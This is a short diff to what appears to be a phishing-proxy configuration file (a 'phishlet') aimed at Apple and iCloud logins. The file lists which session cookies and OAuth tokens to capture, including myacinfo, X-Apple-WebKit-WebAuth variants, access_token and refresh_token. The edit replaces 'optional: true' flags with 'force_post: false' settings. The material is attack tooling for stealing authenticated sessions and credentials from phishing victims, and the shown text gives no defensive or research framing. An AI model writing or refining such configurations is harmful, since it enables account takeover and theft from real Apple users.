@@ -30,24 +30,25 @@ auth_tokens:
   - domain: '.apple.com'
     keys: ['dslang', 'myacinfo', 'aasp', 'aasp_*', 'dqsid', 'idmsa_session_id']
     type: 'cookie'
+    force_post: false
   
   # Session and security cookies
   - domain: '.apple.com'
     keys: ['apz', 'apz_*', 'JSESSIONID', 'X-Apple-WebKit-WebAuth']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # iCloud-specific cookies
   - domain: '.icloud.com'
     keys: ['X-Apple-WebKit-WebAuth', 'X-Apple-WebKit-WebAuth-User', 'X-Apple-WebKit-WebAuth-Session']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # OAuth tokens
   - domain: '.apple.com'
     keys: ['oauth_token', 'oauth_token_secret', 'access_token', 'refresh_token']
     type: 'cookie'
-    optional: true
+    force_post: false
 
 credentials:
   username:
